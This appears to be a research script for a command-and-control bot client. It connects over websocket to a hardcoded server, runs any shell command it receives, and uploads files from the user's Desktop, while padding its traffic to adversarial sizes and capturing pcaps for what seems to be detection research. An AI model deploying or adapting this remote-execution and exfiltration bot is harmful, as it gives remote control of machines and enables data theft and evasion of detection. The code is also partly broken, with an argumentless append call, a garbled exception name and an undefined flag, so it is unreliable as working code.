"""
*****main file****** 
19.2.2025
To be able to conduct tcpdump wihtou using sudo for running the code u need to make exception
for tcpdump first using the following in the terminal:
sudo setcap cap_net_raw,cap_net_admin=eip $(which tcpdump)
---------config generator-----
    - Each client consist of 2 different configs which are combined: rce/exfil and adversarial requirements
    - Both will be generated in client side and send to server but server will control on execution of each and their termination conditions
    - After client is connected, it sends client_config including: underlaying limit,termination condition, src2dst/dst2src_max_ps
    - Then client_config would be added to the generated config in server side 
    - This way allows us to dynamically run bots with different config and criteria while capturing pcap
    - Why in client side? because client is dynamic created and deleted but server is run one time for ever, thus hard to manage different dynamic config requirements

"""
from pathlib import Path
import asyncio
import websockets, string
import json, os, random, yaml
from datetime import datetime

import subprocess, signal, traceback
from concurrent.futures import TimeoutError as ConnectionTimeoutError
from ConfigGenerator import config_generator
from get_bot_ready import get_client_configuration
class persistent_connection_via_websocket():
    def __init__(self, client_config):
        self.client_config = client_config
        self.server = "localhost"
        self.server_port = 5000
    def generate_random_string(self,size):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=size))
    async def rce(self, websocket, command):
        """Executes a command and returns the output."""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            rce_output= result.stdout.strip() if result.stdout else result.stderr.strip()
            # Send response back to server
            response = json.dumps({"rce": rce_output})
            await websocket.send(response)
        except Exception as e:
            return str(e)
    async def exfil(self, websocket, file_path ,**kwargs):
            with open(file_path, 'rb') as f:
                while chunk := f.read(15336):
                    await websocket.send(chunk)
                    await asyncio.sleep(0.01)
            await websocket.send("exfil_done")  # Command to initiate the upload
    

    async def websocket_client(self,server='10.10.54.34', server_port=5000):
        uri = f"ws://{server}:{server_port}"
        async with websockets.connect(uri) as websocket:
            self.websocket = websocket
            await websocket.send(json.dumps(self.client_config)) # send final client config including rce/exfil and adversarial to server

            # send config to server 
            while True:
                # Receive command from server
                command_message = await websocket.recv()
                command_data = json.loads(command_message)
                print(f"{list(command_data.keys())[0]}===>{list(command_data.values())[0]}")

                if "finish" in command_data:
                    break
            
                elif "rce" in  list(command_data.keys())[0] :
                    #command = list(command_data.values())[0]
                    await self.rce(websocket=websocket,command=list(command_data.values())[0])
                elif "exfil" in  list(command_data.keys())[0]:
                    #whoami=subprocess.run(['whoami'], capture_output=True, text=True)
                    home_directory = Path.home()
                    target_path = home_directory / "Desktop" 
                    await self.exfil(websocket=websocket, file_path=f"{target_path}/{list(command_data.values())[0]}")
                elif "src2dst_max_ps" in list(command_data.keys())[0] and command_data["src2dst_max_ps"] != None:
                    pad= self.generate_random_string(command_data["src2dst_max_ps"])
                    await websocket.send(pad)
                elif "dst2src_max_ps" in list(command_data.keys())[0] and command_data["dst2src_max_ps"] != None:
                    await websocket.recv()
                elif "src2dst_packets" in list(command_data.keys())[0] and command_data["src2dst_packets"] != None:
                    pad = ""
                    for i in range(command_data["src2dst_packets"]):
                        await websocket.send(pad) 
                    await websocket.send("END") 
                elif "dst2src_bytes" in list(command_data.keys())[0] and command_data["dst2src_bytes"] != None:
                    await websocket.recv()               
                elif "src2dst_bytes" in list(command_data.keys())[0] and command_data["src2dst_bytes"] != None:
                    pad= self.generate_random_string(command_data["src2dst_bytes"])
                    await websocket.send(pad)
                elif "dst2src_packets" in list(command_data.keys())[0] and command_data["dst2src_packets"] != None:

                    try:
                        while True:
                            message = await websocket.recv()  # Receive message from the WebSocket connection
                            if message == "END":
                                break  # Exit the loop and close the connection
                            # You can process the message here
                    except websockets.exceptions.ConnectionClosed:
                        print("Connection closed")

            await websocket.close()
  
    async def wait_closed(self):
        # Wait until the WebSocket connection is fully closed
        if self.websocket and not self.websocket.close:
            await self.websocket.wait_closed()

  #--------------starting the code----------------------------
def start_tcpdump( interface: str, output_file):
    #command = ["tcpdump", "-i", interface, "-w", output_file]
    #tcpdump_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
    command = ["tcpdump", "-i", interface, "port 5000", "-w", output_file]
    tcpdump_process = subprocess.Popen(command, preexec_fn=os.setsid)
    return tcpdump_process
def stop_tcpdump( process):
        print("---------------------------------------> killed")
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
        #await process.wait()

def client_conf_generator(config_file_addr:str= "websocket/config.yaml",**kwargs):
    input_kwargs = kwargs
    termination = {}
    cnf_gen= config_generator(config_file_addr)
    exec_conf= cnf_gen.config_maker()
    #--------------make termination based on termination condition and value set in underlaying
    if "termination_conditions" in input_kwargs.keys(): 
        for item in input_kwargs["termination_conditions"]:
            termination[item] = input_kwargs["underlay_limit"][item]

    #--------------
    
    client_config = (termination|exec_conf | input_kwargs) #combine all
    items = list(client_config.items())# make item position randomize
    random.shuffle(items)
    shuffled_dic ={}
    for key, value in items:
        shuffled_dic[key] = value
    return shuffled_dic



async def main():
    bot_config = get_client_configuration()
    print("===============Final configuration:===============")
    print(bot_config)

    script_dir = Path(__file__).parent.parent
    conf_path = script_dir  / "configs" / "config.yaml"


    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    bot_config["capture"]= False
    if capture_flag:
        tcpdump_process = start_tcpdump("lo", f"websocket/pcap/file_{current_time}.pcap")
    
    #-------------loading pertube config and declearining termination and underlaying limit
    yaml_file = script_dir / 'output.yaml' #"/home/mehrdad/PycharmProjects/C2_communication/GAN/output.yaml"
    underlay_limit = { 'src2dst_packets': 0, 'src2dst_bytes': 0, 'src2dst_max_ps': 0, 'dst2src_packets': 0, 'dst2src_bytes': 0, 'dst2src_max_ps': 0 }
    with open(yaml_file, 'r') as file:
        try:
            data =yaml.safe_load(file)
        except yaml.YAMLError as e:
            print(f"Error parsing YAML: {e}")
    
    for key, sub_dict in data.items():
        # Find the maximum length of lists within the sub-dictionary
        max_len = max(30 for values in sub_dict.values()) #*************************************************
        termination_conditions = []
        # Iterate through each index of the lists
        for i in range(max_len):
            # Process the values for this index across all keys in sub_dict
            print(f"Processing {key}:")
            for sub_key, values in sub_dict.items():
                if i < len(values):  # Check if the index is valid for the list
                    print(f"  {sub_key}: {values[i]}")
                    termination_conditions.append()
                    underlay_limit[sub_key] = int(values[i]) #set pertube value to key as limitation

        
    #for i in range(5000):
            client_config = client_conf_generator(config_file_addr=conf_path)
            print(f"=============Iteration {i}============== ")
            print(f"Gnerated Config:\n{client_config}\n")

            try:
                bot = persistent_connection_via_websocket(client_config=client_config)
                await bot.websocket_client(server='10.11.54.137')

            except websockets.exceptions.Connsub_keyectionClosed as e:
                print("Connection closed:", e)
                #stop_tcpdump(tcpdump_process)

            except ConnectionRefusedError:
                print('Connection refused')

            except ConnectionTimeoutError:
                print('Connection Timeout')

            except Exception as ex:
                traceback.print_exc()

            finally:
                await bot.wait_closed()
    if capture_flag:
        stop_tcpdump(tcpdump_process)
    await asyncio.sleep(random.randint(1,2))


if __name__ == "__main__":
    asyncio.run(main())
